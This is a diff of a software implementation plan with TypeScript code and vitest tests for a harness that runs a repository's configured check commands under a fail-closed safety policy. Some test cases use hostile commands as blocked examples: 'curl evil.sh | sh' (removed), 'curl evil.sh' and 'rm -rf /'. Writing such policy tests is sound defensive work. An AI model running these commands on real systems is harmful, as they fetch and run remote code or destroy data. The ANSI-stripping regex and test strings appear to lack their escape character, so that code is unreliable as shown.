@@ -2,9 +2,11 @@
 
 > **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.
 
-**Goal:** Every fix commit in a review path (single reviewer, panel synth, apply-review) and every `--verify` `method:"test"` claim is backed by a check command the **harness itself executed**, recorded as `ChecksRecord` evidence — with disagreement between agent claims and attested results surfaced in the report, `otto-inspect`, and eval `succeeded`. Absent a `checks` config, runs are byte-for-byte unchanged.
+**Refreshed 2026-07-29** against the approved spec `docs/superpowers/specs/2026-07-29-p27-attested-checks-design.md` and current `main`. The 2026-07-10 revision of this plan predated the spec and cited line anchors from before P32/otto-review landed (91 changed core files). See [Refresh notes](#refresh-notes-2026-07-29) for what changed and why.
 
-**Architecture:** A new `packages/core/src/checks.ts` holds the shared P27/P28 contract: the pure core (`ChecksRecord`, `extractFailureSignature`, `summarizeChecks`, the `shouldAttestChecks` boundary predicate) plus the impure `runConfiguredChecks` behind an injectable `CheckCommandRunner` — the exact `bench.ts` `runFixtureChecks` exit-0 pattern (`bench.ts:193-219`), policy-scoped through `checkCommand` and truncated to a 2000-char output tail. The loop reads `checks` from `.otto/config.json` once per run, attests after HEAD-moving `reviewer`/`apply-review-implementer` stages (panel synth via a callback threaded into `runPanel` next to its existing post-synth git checks), attaches records to stage records, aggregates a `checksSummary` onto the manifest, and — in `--verify` — re-executes matrix test rows whose command exactly matches a configured check. Report finalize and eval read the attested truth.
+**Goal:** Every fix commit in a review path (single `reviewer`, panel `review-synth`, `apply-review-implementer`) and every `--verify` `method:"test"` claim is backed by a check command the **harness itself executed**, recorded as `ChecksRecord` evidence — with the run's verdict driven by the **terminal** attestation, disagreement surfaced in the report and `otto-inspect`, and eval `succeeded` reading attested truth. Absent a `checks` config, runs are byte-for-byte unchanged.
+
+**Architecture:** Two modules. `packages/core/src/checks.ts` holds the pure contract (`ChecksRecord`, `extractFailureSignature`, `summarizeChecks`) plus the impure policy-scoped runner (`runConfiguredChecks`, fail-fast) behind an injectable `CheckCommandRunner` — the `bench.ts` `runFixtureChecks` exit-0 pattern. `packages/core/src/attestation.ts` holds the orchestration: the boundary predicate, the append-only ledger, terminal-state resolution, and exit-reason derivation. The loop wires attestation into the **single existing `recordStage` closure** (`loop.ts:775`), which both the normal stage path and `panel.ts` already call — so panel synth attestation needs no new panel hook.
 
 **Tech Stack:** TypeScript (NodeNext ESM), Node ≥20, vitest. `packages/core` only. No new npm dependencies.
 
@@ -12,10 +14,12 @@
 
 - **ESM only.** Relative imports in `packages/core/src/` end in `.js`.
 - **No new npm dependencies.** The runner is `spawnSync` + `resolveShell()` (`render.ts:60`), same as `bench.ts`.
-- **Shared contract is verbatim.** `ChecksRecord`, `runConfiguredChecks(commands, cwd, timeoutMs?)`, `extractFailureSignature(outputTail)`, `summarizeChecks(records)`, `StageRecord.checks?`, `RunManifest.checksSummary?` ship exactly as specced — P28 imports these shapes. Injection params (runner, policy, clock) are **trailing optionals only**.
-- **Off by default.** `readChecksConfig` → `[]` when `.otto/config.json` has no `checks` array; every new seam short-circuits on empty config, so a bare run renders, records, reports, and scores exactly as before.
-- **Policy-scoped, fail-closed.** Every command passes `checkCommand` (`safety-policy.ts:104`) before spawning; blocked ⇒ recorded failure, never executed. Agent-emitted matrix commands run only on exact match against the configured allowlist.
+- **Off by default.** `readChecksConfig` → `[]` when `.otto/config.json` has no `checks` array; every seam short-circuits on empty config, so a bare run renders, records, reports, and scores exactly as before.
+- **Policy-scoped, fail-closed.** Every command passes `checkCommand` (`safety-policy.ts:104`) before spawning; blocked ⇒ recorded failure, never executed. Agent-emitted matrix commands run only on **exact match** against the configured allowlist.
 - **Harness-only evidence fields.** `checks`, `checksSummary`, `attestedCheck` are set by the loop/finalize only — never parsed from agent JSON (mirror `artifactExists`, `verification-matrix.ts:49-53`).
+- **Terminal state decides the verdict.** `succeeded` reads `terminalFailed`, never the cumulative tally (spec D1).
+- **Fail-fast within a boundary.** Checks stop at the first non-zero exit; unrun commands surface as `skipped`, never as records (spec D2).
+- **Exit reasons are human-readable sentences,** matching `NEXT_ACTION`'s existing keys (`next-action.ts`) — not kebab-case slugs.
 - **CI tests never spawn real check commands** — inject stub runners; the default runner is exercised only by operators.
 - **Verify command:** `pnpm -r typecheck && pnpm -r test && pnpm test`. Pre-commit runs prettier + typecheck.
 - **Never hand-edit release version state.** release-please owns it.
@@ -33,10 +37,10 @@
 **Interfaces:**
 
 - Consumes: nothing (leaf module this task).
-- Produces (the P28-shared contract, verbatim):
+- Produces (the P28-shared contract):
   - `export type ChecksRecord = { command: string; exitCode: number; durationMs: number; outputTail: string; failureSignature: string | null; attestedAt: string };`
   - `export function extractFailureSignature(outputTail: string): string | null;` — pure: first line carrying a failure marker (`FAIL`/`FAILED`/`✗`/`✘`/`Error`/`error TS…`/`ERR!`/`AssertionError`), ANSI-stripped, whitespace-collapsed, durations normalized to `<duration>`, capped at 200 chars; `null` when no line matches.
-  - `export function summarizeChecks(records: ChecksRecord[]): { passed: number; failed: number; failureSignatures: string[] };` — pure: `passed` = exit-0 count, `failed` = the rest, `failureSignatures` = deduped signatures of failed records (falling back to `` `exit ${exitCode}` `` when a record carries none).
+  - `export function summarizeChecks(records: ChecksRecord[], configuredCount: number): { passed: number; failed: number; skipped: number; failureSignatures: string[] };` — pure: `passed` = exit-0 count, `failed` = the rest, `skipped` = `max(0, configuredCount - records.length)` (fail-fast left them unrun), `failureSignatures` = deduped signatures of failed records (falling back to `` `exit ${exitCode}` ``).
 
 - [ ] **Step 1: Write the failing test**
 
@@ -55,35 +59,39 @@ const record = (over: Partial<ChecksRecord>): ChecksRecord => ({
   durationMs: 100,
   outputTail: "",
   failureSignature: null,
-  attestedAt: "2026-07-10T00:00:00.000Z",
+  attestedAt: "2026-07-29T00:00:00.000Z",
   ...over,
 });
 
 describe("extractFailureSignature", () => {
   it("extracts the first vitest failure line, ANSI-stripped", () => {
     const tail =
-      "  \u001b[32m✓\u001b[0m src/a.test.ts (3 tests)\n" +
-      "  \u001b[31mFAIL\u001b[0m  src/b.test.ts > summarize > tallies\n" +
+      "  [32m✓[0m src/a.test.ts (3 tests)\n" +
+      "  [31mFAIL[0m  src/b.test.ts > summarize > tallies\n" +
       "  another FAIL line\n";
     expect(extractFailureSignature(tail)).toBe(
       "FAIL src/b.test.ts > summarize > tallies"
     );
   });
+
   it("extracts a tsc error line", () => {
     const tail = "src/x.ts(3,1): error TS2304: Cannot find name 'y'.\n";
     expect(extractFailureSignature(tail)).toBe(
       "src/x.ts(3,1): error TS2304: Cannot find name 'y'."
     );
   });
+
   it("is stable across differing durations", () => {
     const a = extractFailureSignature("✗ compress survives (312ms)");
     const b = extractFailureSignature("✗ compress survives (7ms)");
     expect(a).toBe(b);
     expect(a).toContain("<duration>");
   });
-  it("null when no failure marker is present", () => {
+
+  it("returns null when no failure marker is present", () => {
     expect(extractFailureSignature("all 42 tests passed\n")).toBeNull();
   });
+
   it("caps the signature at 200 chars", () => {
     const sig = extractFailureSignature(`FAIL ${"x".repeat(500)}`);
     expect(sig).not.toBeNull();
@@ -92,303 +100,389 @@ describe("extractFailureSignature", () => {
 });
 
 describe("summarizeChecks", () => {
-  it("tallies passed/failed and collects deduped failure signatures", () => {
-    const s = summarizeChecks([
-      record({}),
-      record({ exitCode: 1, failureSignature: "FAIL src/b.test.ts" }),
-      record({ exitCode: 1, failureSignature: "FAIL src/b.test.ts" }),
-      record({ exitCode: 2, failureSignature: null }),
-    ]);
+  it("tallies passed and failed", () => {
+    const s = summarizeChecks(
+      [
+        record({ exitCode: 0 }),
+        record({ exitCode: 1, failureSignature: "FAIL a" }),
+      ],
+      2
+    );
     expect(s).toEqual({
       passed: 1,
-      failed: 3,
-      failureSignatures: ["FAIL src/b.test.ts", "exit 2"],
+      failed: 1,
+      skipped: 0,
+      failureSignatures: ["FAIL a"],
     });
   });
-  it("empty input → zero summary", () => {
-    expect(summarizeChecks([])).toEqual({
-      passed: 0,
-      failed: 0,
-      failureSignatures: [],
-    });
+
+  it("reports fail-fast skipped commands", () => {
+    // 3 configured, ladder stopped after the first failure ⇒ 2 never ran.
+    const s = summarizeChecks(
+      [record({ exitCode: 1, failureSignature: "FAIL a" })],
+      3
+    );
+    expect(s.skipped).toBe(2);
+    expect(s.passed).toBe(0);
+    expect(s.failed).toBe(1);
+  });
+
+  it("dedupes signatures and falls back to the exit code", () => {
+    const s = summarizeChecks(
+      [
+        record({ exitCode: 1, failureSignature: "FAIL a" }),
+        record({ exitCode: 1, failureSignature: "FAIL a" }),
+        record({ exitCode: 2, failureSignature: null }),
+      ],
+      3
+    );
+    expect(s.failureSignatures).toEqual(["FAIL a", "exit 2"]);
+  });
+
+  it("never reports negative skipped when records exceed the config", () => {
+    expect(summarizeChecks([record({}), record({})], 1).skipped).toBe(0);
   });
 });
 ```
 
-- [ ] **Step 2: Run test to verify it fails**
+- [ ] **Step 2: Run the test to verify it fails**
 
-Run: `pnpm --filter @phamvuhoang/otto-core test -- checks.test`
-Expected: FAIL — module `../checks.js` not found.
+Run: `pnpm --filter @phamvuhoang/otto-core test -- checks`
+Expected: FAIL — `Cannot find module '../checks.js'`.
 
-- [ ] **Step 3: Implement the pure core**
+- [ ] **Step 3: Write the minimal implementation**
 
 ```ts
 // packages/core/src/checks.ts
 /**
- * Harness-attested feedback loops (P27): the repo's configured check commands,
- * executed by the HARNESS after review-path fix commits — not self-reported by
- * the agent. This module is the shared P27/P28 contract: P28's regression
- * signals consume ChecksRecord/summarizeChecks verbatim. Pure except for
- * runConfiguredChecks' default runner (Task 2), which reuses the bench.ts
- * runFixtureChecks exit-0 pattern behind an injectable seam.
+ * P27 harness-attested checks — the pure core.
+ *
+ * The harness executes the repo's configured check commands itself instead of
+ * trusting an agent's prose that "the suites pass". This module holds the
+ * shared P27/P28 contract: the record shape, failure-signature extraction, and
+ * the tally. The impure runner lives here too (Task 2); orchestration lives in
+ * `attestation.ts`.
  */
 
-/** One harness-executed check command and its observed outcome. */
+/** One harness-executed check command and what the harness observed. */
 export type ChecksRecord = {
-  /** The configured command as run (verbatim from `.otto/config.json` checks). */
   command: string;
-  /** Observed exit code; -1 for signal-kill, spawn failure, or a policy block. */
+  /** Process exit code; `-1` for a timeout, spawn failure, or policy block. */
   exitCode: number;
-  /** Wall-clock execution time in ms (0 when the command never spawned). */
   durationMs: number;
   /** Last {@link OUTPUT_TAIL_LIMIT} chars of combined stdout+stderr. */
   outputTail: string;
-  /** Stable signature of the first failure line, or null when the check passed. */
+  /** Stable, duration-normalized failure fingerprint; `null` when passing. */
   failureSignature: string | null;
-  /** ISO timestamp of when the harness attested this result. */
   attestedAt: string;
 };
 
-/** Output tails are truncated to this many trailing chars before recording. */
-export const OUTPUT_TAIL_LIMIT = 2000;
+const FAILURE_MARKERS =
+  /(\bFAILED?\b|✗|✘|\bERR!\b|\bAssertionError\b|\berror TS\d+\b|\bError\b)/;
 
-const ANSI_RE = /\u001b\[[0-9;]*m/g;
-// First-failure-line markers across the common toolchains Otto drives:
-// vitest/jest (FAIL, ✗/✘), tsc (error TSxxxx), npm/pnpm (ERR!), node:assert.
-const FAILURE_MARKER_RE =
-  /✗|✘|\bFAIL(?:ED)?\b|\bERR!|\bError\b|error TS\d+|AssertionError/;
-const DURATION_RE = /\b\d+(?:\.\d+)?\s?(?:ms|s)\b/g;
+/** Strip SGR/CSI escapes so signatures don't vary with terminal colour. */
+function stripAnsi(s: string): string {
+  // eslint-disable-next-line no-control-regex
+  return s.replace(/\[[0-9;]*[A-Za-z]/g, "");
+}
+
+const SIGNATURE_LIMIT = 200;
 
 /**
- * Stable signature of the first failure line in a check's output tail — the
- * key P28 uses to detect the SAME failure recurring across iterations, so it
- * strips ANSI color, collapses whitespace, and normalizes durations (which
- * differ run to run). Null when no line carries a failure marker. Pure.
+ * First failure-marked line of `outputTail`, normalized so the same defect
+ * yields the same string across runs: ANSI stripped, whitespace collapsed,
+ * timings replaced with `<duration>` (otherwise every run is a "new" failure).
  */
 export function extractFailureSignature(outputTail: string): string | null {
-  for (const raw of outputTail.split("\n")) {
-    const line = raw.replace(ANSI_RE, "").trim();
-    if (!line || !FAILURE_MARKER_RE.test(line)) continue;
-    return line
-      .replace(DURATION_RE, "<duration>")
+  for (const raw of stripAnsi(outputTail).split("\n")) {
+    if (!FAILURE_MARKERS.test(raw)) continue;
+    const line = raw
+      .replace(/\(\s*\d+(\.\d+)?\s*(ms|s|m)\s*\)/g, "(<duration>)")
+      .replace(/\b\d+(\.\d+)?(ms|s)\b/g, "<duration>")
       .replace(/\s+/g, " ")
-      .slice(0, 200);
+      .trim();
+    if (line.length === 0) continue;
+    return line.slice(0, SIGNATURE_LIMIT);
   }
   return null;
 }
 
 /**
- * Aggregate check records into the manifest-level summary. A failed record
- * without a signature (e.g. a silent nonzero exit) falls back to `exit N` so
- * every failure is representable in `failureSignatures`. Deduped, order kept. Pure.
+ * Tally a boundary's records. `configuredCount` is how many commands were
+ * configured, so fail-fast short-circuiting surfaces as `skipped` rather than
+ * silently reading as "the rest passed".
  */
-export function summarizeChecks(records: ChecksRecord[]): {
+export function summarizeChecks(
+  records: ChecksRecord[],
+  configuredCount: number
+): {
   passed: number;
   failed: number;
+  skipped: number;
   failureSignatures: string[];
 } {
-  const failed = records.filter((r) => r.exitCode !== 0);
-  const failureSignatures: string[] = [];
-  for (const r of failed) {
+  const passed = records.filter((r) => r.exitCode === 0).length;
+  const failedRecords = records.filter((r) => r.exitCode !== 0);
+  const signatures: string[] = [];
+  for (const r of failedRecords) {
     const sig = r.failureSignature ?? `exit ${r.exitCode}`;
-    if (!failureSignatures.includes(sig)) failureSignatures.push(sig);
+    if (!signatures.includes(sig)) signatures.push(sig);
   }
   return {
-    passed: records.length - failed.length,
-    failed: failed.length,
-    failureSignatures,
+    passed,
+    failed: failedRecords.length,
+    skipped: Math.max(0, configuredCount - records.length),
+    failureSignatures: signatures,
   };
 }
 ```
 
-Export `ChecksRecord`, `extractFailureSignature`, `summarizeChecks`, `OUTPUT_TAIL_LIMIT` from `index.ts` (alongside the other core exports).
+- [ ] **Step 4: Export from the package index**
 
-- [ ] **Step 4: Run test to verify it passes**
+In `packages/core/src/index.ts`, add alongside the existing exports:
 
-Run: `pnpm --filter @phamvuhoang/otto-core test -- checks.test`
-Expected: PASS (7 tests).
+```ts
+export {
+  extractFailureSignature,
+  summarizeChecks,
+  type ChecksRecord,
+} from "./checks.js";
+```
 
-- [ ] **Step 5: Typecheck + commit**
+- [ ] **Step 5: Run the tests to verify they pass**
+
+Run: `pnpm --filter @phamvuhoang/otto-core test -- checks`
+Expected: PASS (9 tests).
+
+- [ ] **Step 6: Commit**
 
 ```bash
-pnpm -r typecheck
 git add packages/core/src/checks.ts packages/core/src/index.ts packages/core/src/__tests__/checks.test.ts
-git commit -m "feat(p27): pure checks core — ChecksRecord, failure signatures, summary"
+git commit -m "feat(p27): pure checks core - record shape, failure signature, tally"
 ```
 
 ---
 
-### Task 2: `checks` config + policy-scoped runner (`readChecksConfig`, `runConfiguredChecks`)
+### Task 2: `checks` config + policy-scoped fail-fast runner
 
 **Files:**
 
 - Modify: `packages/core/src/checks.ts`
-- Modify: `packages/core/src/index.ts` (export `readChecksConfig`, `runConfiguredChecks`, `CheckCommandRunner`, `DEFAULT_CHECK_TIMEOUT_MS`)
+- Modify: `packages/core/src/index.ts`
 - Test: `packages/core/src/__tests__/checks-runner.test.ts`
 
 **Interfaces:**
 
-- Consumes: `resolveShell` (`render.ts:60`); `checkCommand`, `DEFAULT_POLICY`, `SafetyPolicy` (`safety-policy.ts`); `extractFailureSignature`, `OUTPUT_TAIL_LIMIT` (Task 1).
+- Consumes: `ChecksRecord`, `extractFailureSignature` (Task 1); `checkCommand(policy, command): PolicyViolation[]` (`safety-policy.ts:104`); `resolveShell()` (`render.ts:60`).
 - Produces:
-  - `export function readChecksConfig(workspaceDir: string): string[];` — tolerant `.otto/config.json` `checks` reader (mirrors `readSkillsConfig`, `skill-activation.ts:49`); absent/malformed/non-array/non-string entries ⇒ dropped; never throws; `[]` = disabled.
-  - `export type CheckCommandRunner = (command: string, cwd: string, timeoutMs: number) => { status: number | null; output: string };` — the injectable seam (mirror `CheckRunner`, `bench.ts:193-196`).
-  - `export const DEFAULT_CHECK_TIMEOUT_MS = 600_000;`
-  - `export function runConfiguredChecks(commands: string[], cwd: string, timeoutMs?: number, run?: CheckCommandRunner, policy?: SafetyPolicy, now?: () => string): ChecksRecord[];` — contract arity `(commands, cwd, timeoutMs?)` with trailing optional injection. Per command: policy check first (blocked ⇒ `exitCode: -1`, `durationMs: 0`, tail = the violation, never spawned); else run, exit-0 = pass, null status ⇒ `-1`, tail truncated to the last `OUTPUT_TAIL_LIMIT` chars, `failureSignature` null on pass else `extractFailureSignature(tail) ?? \`exit ${exitCode}\``.
+  - `export type CheckCommandRunner = (command: string, cwd: string, timeoutMs: number) => { status: number | null; output: string };`
+  - `export function readChecksConfig(workspaceDir: string): string[];` — tolerant reader mirroring `readSkillsConfig` (`skill-activation.ts:49`); missing/malformed ⇒ `[]`, never throws.
+  - `export function runConfiguredChecks(commands: string[], cwd: string, timeoutMs?: number, run?: CheckCommandRunner, policy?: SafetyPolicy, now?: () => string): ChecksRecord[];` — **fail-fast**: runs in order, stops after the first non-zero exit. Injection params are trailing optionals only.
 
 - [ ] **Step 1: Write the failing test**
 
 ```ts
 // packages/core/src/__tests__/checks-runner.test.ts
-import { mkdirSync, mkdtempSync, writeFileSync } from "node:fs";
+import { mkdtempSync, writeFileSync, mkdirSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { describe, it, expect } from "vitest";
 import {
   readChecksConfig,
   runConfiguredChecks,
-  OUTPUT_TAIL_LIMIT,
   type CheckCommandRunner,
 } from "../checks.js";
-import { parseSafetyPolicy } from "../safety-policy.js";
+import { DEFAULT_POLICY } from "../safety-policy.js";
 
-const NOW = () => "2026-07-10T00:00:00.000Z";
+function workspace(config?: unknown): string {
+  const dir = mkdtempSync(join(tmpdir(), "otto-checks-"));
+  if (config !== undefined) {
+    mkdirSync(join(dir, ".otto"), { recursive: true });
+    writeFileSync(join(dir, ".otto", "config.json"), JSON.stringify(config));
+  }
+  return dir;
+}
 
 describe("readChecksConfig", () => {
-  it("reads the checks array, dropping non-string entries", () => {
-    const dir = mkdtempSync(join(tmpdir(), "otto-checks-"));
-    mkdirSync(join(dir, ".otto"), { recursive: true });
-    writeFileSync(
-      join(dir, ".otto", "config.json"),
-      JSON.stringify({ checks: ["pnpm -r typecheck", 42, "", "pnpm -r test"] })
-    );
+  it("reads a string array", () => {
+    const dir = workspace({ checks: ["pnpm -r typecheck", "pnpm -r test"] });
     expect(readChecksConfig(dir)).toEqual([
       "pnpm -r typecheck",
       "pnpm -r test",
     ]);
   });
-  it("absent config / absent field → [] (inert)", () => {
+
+  it("returns [] when the key is absent (inert)", () => {
+    expect(readChecksConfig(workspace({ branchStrategy: "branch" }))).toEqual(
+      []
+    );
+  });
+
+  it("returns [] when there is no config file at all", () => {
+    expect(readChecksConfig(workspace())).toEqual([]);
+  });
+
+  it("returns [] on malformed JSON rather than throwing", () => {
     const dir = mkdtempSync(join(tmpdir(), "otto-checks-"));
-    expect(readChecksConfig(dir)).toEqual([]);
     mkdirSync(join(dir, ".otto"), { recursive: true });
-    writeFileSync(join(dir, ".otto", "config.json"), JSON.stringify({}));
+    writeFileSync(join(dir, ".otto", "config.json"), "{ not json");
     expect(readChecksConfig(dir)).toEqual([]);
+  });
+
+  it("drops non-string entries", () => {
+    const dir = workspace({ checks: ["ok", 42, null] });
+    expect(readChecksConfig(dir)).toEqual(["ok"]);
   });
 });
 
 describe("runConfiguredChecks", () => {
-  const stub =
-    (fn: (command: string) => { status: number | null; output: string }) =>
-    (calls: string[]): CheckCommandRunner =>
-    (command) => {
-      calls.push(command);
-      return fn(command);
+  const clock = () => "2026-07-29T00:00:00.000Z";
+
+  it("records a passing command", () => {
+    const run: CheckCommandRunner = () => ({ status: 0, output: "ok\n" });
+    const [rec] = runConfiguredChecks(
+      ["pnpm -r test"],
+      "/w",
+      1000,
+      run,
+      DEFAULT_POLICY,
+      clock
+    );
+    expect(rec.exitCode).toBe(0);
+    expect(rec.failureSignature).toBeNull();
+    expect(rec.attestedAt).toBe("2026-07-29T00:00:00.000Z");
+  });
+
+  it("stops at the first failure and never runs later commands", () => {
+    const seen: string[] = [];
+    const run: CheckCommandRunner = (cmd) => {
+      seen.push(cmd);
+      return cmd.includes("typecheck")
+        ? { status: 2, output: "src/x.ts(3,1): error TS2304: nope\n" }
+        : { status: 0, output: "ok\n" };
     };
-
-  it("exit 0 → pass record with null signature", () => {
-    const calls: string[] = [];
-    const run = stub(() => ({ status: 0, output: "42 tests passed\n" }))(calls);
-    const [r] = runConfiguredChecks(
-      ["pnpm -r test"],
-      "/ws",
+    const records = runConfiguredChecks(
+      ["pnpm -r typecheck", "pnpm -r test"],
+      "/w",
       1000,
       run,
-      undefined,
-      NOW
+      DEFAULT_POLICY,
+      clock
     );
-    expect(r).toEqual({
-      command: "pnpm -r test",
-      exitCode: 0,
-      durationMs: r.durationMs,
-      outputTail: "42 tests passed\n",
-      failureSignature: null,
-      attestedAt: "2026-07-10T00:00:00.000Z",
-    });
-    expect(calls).toEqual(["pnpm -r test"]);
+    expect(seen).toEqual(["pnpm -r typecheck"]); // the suite never spawned
+    expect(records).toHaveLength(1);
+    expect(records[0].exitCode).toBe(2);
+    expect(records[0].failureSignature).toContain("error TS2304");
   });
 
-  it("nonzero exit → failure signature from the output tail", () => {
-    const run = stub(() => ({
-      status: 1,
-      output: "…\nFAIL src/b.test.ts > adds\n",
-    }))([]);
-    const [r] = runConfiguredChecks(
-      ["pnpm -r test"],
-      "/ws",
+  it("runs every command while they keep passing", () => {
+    const seen: string[] = [];
+    const run: CheckCommandRunner = (cmd) => {
+      seen.push(cmd);
+      return { status: 0, output: "ok\n" };
+    };
+    runConfiguredChecks(
+      ["a", "b", "c"],
+      "/w",
       1000,
       run,
-      undefined,
-      NOW
+      DEFAULT_POLICY,
+      clock
     );
-    expect(r.exitCode).toBe(1);
-    expect(r.failureSignature).toBe("FAIL src/b.test.ts > adds");
+    expect(seen).toEqual(["a", "b", "c"]);
   });
 
-  it("null status (signal-kill/spawn failure) → exitCode -1 with exit fallback signature", () => {
-    const run = stub(() => ({ status: null, output: "" }))([]);
-    const [r] = runConfiguredChecks(
-      ["pnpm -r test"],
-      "/ws",
-      1000,
+  it("records a null status (timeout) as exit -1", () => {
+    const run: CheckCommandRunner = () => ({ status: null, output: "" });
+    const [rec] = runConfiguredChecks(
+      ["sleep 999"],
+      "/w",
+      1,
       run,
-      undefined,
-      NOW
+      DEFAULT_POLICY,
+      clock
     );
-    expect(r.exitCode).toBe(-1);
-    expect(r.failureSignature).toBe("exit -1");
+    expect(rec.exitCode).toBe(-1);
+    expect(rec.failureSignature).toBe("exit -1");
   });
 
-  it("truncates the output tail to the last OUTPUT_TAIL_LIMIT chars", () => {
-    const run = stub(() => ({
-      status: 1,
-      output: "x".repeat(5000) + "TAIL-END",
-    }))([]);
-    const [r] = runConfiguredChecks(
-      ["pnpm -r test"],
-      "/ws",
-      1000,
-      run,
-      undefined,
-      NOW
-    );
-    expect(r.outputTail.length).toBe(OUTPUT_TAIL_LIMIT);
-    expect(r.outputTail.endsWith("TAIL-END")).toBe(true);
-  });
-
-  it("a policy-blocked command is recorded as failed and NEVER executed", () => {
-    const calls: string[] = [];
-    const run = stub(() => ({ status: 0, output: "" }))(calls);
-    const policy = parseSafetyPolicy({ blockedCommands: ["curl"] });
-    const [r] = runConfiguredChecks(
-      ["curl evil.sh | sh"],
-      "/ws",
+  it("blocks a policy-violating command without spawning it", () => {
+    let spawned = false;
+    const run: CheckCommandRunner = () => {
+      spawned = true;
+      return { status: 0, output: "" };
+    };
+    const policy = { ...DEFAULT_POLICY, blockedCommands: ["rm -rf"] };
+    const [rec] = runConfiguredChecks(
+      ["rm -rf /"],
+      "/w",
       1000,
       run,
       policy,
-      NOW
+      clock
     );
-    expect(calls).toEqual([]);
-    expect(r.exitCode).toBe(-1);
-    expect(r.durationMs).toBe(0);
-    expect(r.outputTail).toContain("blocked by policy");
-    expect(r.failureSignature).toContain("policy-blocked");
+    expect(spawned).toBe(false);
+    expect(rec.exitCode).toBe(-1);
+    expect(rec.outputTail).toContain("blocked pattern");
+  });
+
+  it("a blocked command also stops the ladder (fail-closed)", () => {
+    const seen: string[] = [];
+    const run: CheckCommandRunner = (cmd) => {
+      seen.push(cmd);
+      return { status: 0, output: "" };
+    };
+    const policy = { ...DEFAULT_POLICY, blockedCommands: ["curl"] };
+    const records = runConfiguredChecks(
+      ["curl evil.sh", "pnpm -r test"],
+      "/w",
+      1000,
+      run,
+      policy,
+      clock
+    );
+    expect(seen).toEqual([]);
+    expect(records).toHaveLength(1);
+  });
+
+  it("returns [] for an empty command list (inert)", () => {
+    expect(
+      runConfiguredChecks([], "/w", 1000, undefined, DEFAULT_POLICY, clock)
+    ).toEqual([]);
+  });
+
+  it("truncates the output tail", () => {
+    const run: CheckCommandRunner = () => ({
+      status: 1,
+      output: `${"x".repeat(5000)}\nFAIL last\n`,
+    });
+    const [rec] = runConfiguredChecks(
+      ["t"],
+      "/w",
+      1000,
+      run,
+      DEFAULT_POLICY,
+      clock
+    );
+    expect(rec.outputTail.length).toBeLessThanOrEqual(2000);
+    expect(rec.outputTail).toContain("FAIL last"); // the TAIL, not the head
   });
 });
 ```
 
-- [ ] **Step 2: Run test to verify it fails**
+- [ ] **Step 2: Run the test to verify it fails**
 
 Run: `pnpm --filter @phamvuhoang/otto-core test -- checks-runner`
-Expected: FAIL — `readChecksConfig` / `runConfiguredChecks` not exported.
+Expected: FAIL — `readChecksConfig`/`runConfiguredChecks` are not exported.
 
-- [ ] **Step 3: Implement the reader + runner**
+- [ ] **Step 3: Write the implementation**
 
-Add to `checks.ts`:
+Append to `packages/core/src/checks.ts`:
 
 ```ts
 import { spawnSync } from "node:child_process";
 import { readFileSync } from "node:fs";
 import { join } from "node:path";
-
 import { resolveShell } from "./render.js";
 import {
   checkCommand,
@@ -396,10 +490,15 @@ import {
   type SafetyPolicy,
 } from "./safety-policy.js";
 
+/** Last N chars of combined output kept on a record. */
+const OUTPUT_TAIL_LIMIT = 2000;
+/** Default per-command timeout: 10 minutes (matches the repo verify ceiling). */
+const DEFAULT_CHECK_TIMEOUT_MS = 10 * 60 * 1000;
+
 /**
- * Read `.otto/config.json`'s `checks` array — the repo's harness-attested check
- * commands. Absent/malformed file or field → [] (P27 stays fully inert).
- * Mirrors readSkillsConfig/readAgentConfig tolerance: never throws.
+ * `.otto/config.json` → `checks`. Tolerant by design: a missing file, malformed
+ * JSON, a missing key, or a non-array value all yield `[]`, which makes every
+ * P27 seam inert. Never throws — a broken config must not fail a run.
  */
 export function readChecksConfig(workspaceDir: string): string[] {
   try {
@@ -407,125 +506,486 @@ export function readChecksConfig(workspaceDir: string): string[] {
       readFileSync(join(workspaceDir, ".otto", "config.json"), "utf8")
     ) as Record<string, unknown>;
     if (!Array.isArray(raw.checks)) return [];
-    return raw.checks
-      .filter((c): c is string => typeof c === "string" && c.trim() !== "")
-      .map((c) => c.trim());
+    return raw.checks.filter((c): c is string => typeof c === "string");
   } catch {
     return [];
   }
 }
 
-/** Default per-command timeout: 10 minutes (matches the repo verify ceiling). */
-export const DEFAULT_CHECK_TIMEOUT_MS = 600_000;
-
-/**
- * Executes one check command and reports exit status + combined output.
- * Injectable so {@link runConfiguredChecks} stays unit-testable without
- * spawning (the bench.ts CheckRunner seam, `bench.ts:193-201`).
- */
+/** Injectable spawn seam so CI never runs real check commands. */
 export type CheckCommandRunner = (
   command: string,
   cwd: string,
   timeoutMs: number
 ) => { status: number | null; output: string };
 
-const defaultCheckCommandRunner: CheckCommandRunner = (
-  command,
-  cwd,
-  timeoutMs
-) => {
+const defaultCheckRunner: CheckCommandRunner = (command, cwd, timeoutMs) => {
   const r = spawnSync(command, {
-    shell: resolveShell(),
     cwd,
-    timeout: timeoutMs,
+    shell: resolveShell(),
     encoding: "utf8",
-    maxBuffer: 16 * 1024 * 1024,
+    timeout: timeoutMs,
+    maxBuffer: 32 * 1024 * 1024,
   });
-  return { status: r.status, output: `${r.stdout ?? ""}${r.stderr ?? ""}` };
+  return {
+    status: r.status,
+    output: `${r.stdout ?? ""}${r.stderr ?? ""}`,
+  };
 };
 
 /**
- * Run each configured check command in `cwd` and attest the outcome — the
- * impure half of P27, called by the loop only after a review-path fix commit.
- * Exit 0 = pass; a null status (signal-killed / spawn failure) = -1. Policy is
- * fail-closed: a command matching a blocked pattern is recorded as a FAILED
- * record and never spawned, so a repo that blocks its own checks sees the
- * misconfiguration loudly instead of silently losing attestation. Output tails
- * are truncated to the last {@link OUTPUT_TAIL_LIMIT} chars. Trailing params
- * are injection seams for tests; callers use `(commands, cwd, timeoutMs?)`.
+ * Execute the configured checks in order, **stopping at the first failure**
+ * (spec D2): a red typecheck must not pay for the slow suite. Unrun commands
+ * are deliberately absent from the result — `summarizeChecks` reports them as
+ * `skipped` so a short-circuited ladder never reads as a passing suite.
+ *
+ * Fail-closed: a policy-blocked command is recorded as a failure and never
+ * spawned, which also stops the ladder.
  */
 export function runConfiguredChecks(
   commands: string[],
   cwd: string,
   timeoutMs: number = DEFAULT_CHECK_TIMEOUT_MS,
-  run: CheckCommandRunner = defaultCheckCommandRunner,
+  run: CheckCommandRunner = defaultCheckRunner,
   policy: SafetyPolicy = DEFAULT_POLICY,
   now: () => string = () => new Date().toISOString()
 ): ChecksRecord[] {
